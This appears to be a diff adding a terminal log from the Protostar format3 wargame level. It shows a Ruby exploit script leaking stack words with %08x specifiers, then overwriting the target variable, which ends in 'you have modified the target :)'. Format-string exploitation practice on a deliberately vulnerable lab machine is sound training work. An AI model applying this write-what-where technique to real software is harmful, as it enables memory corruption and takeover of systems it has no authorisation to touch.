@@ -1,0 +1,6 @@
+user@protostar:/tmp/format$ ./format3.rb 
+ABCD00000000|bffff5a0|b7fd7ff4|00000000|00000000|bffff7a8|0804849d|bffff5a0|00000200|b7fd8420|bffff5e4|44434241|78383025|3830257c|30257c78|257c7838|7c783830|78383025|3830257c|30257c78|
+target is 00000000 :(
+???                                                       0         bffff5a0                                                                                                                                                                     b7fd7ff4
+you have modified the target :)
+user@protostar:/tmp/format$ 
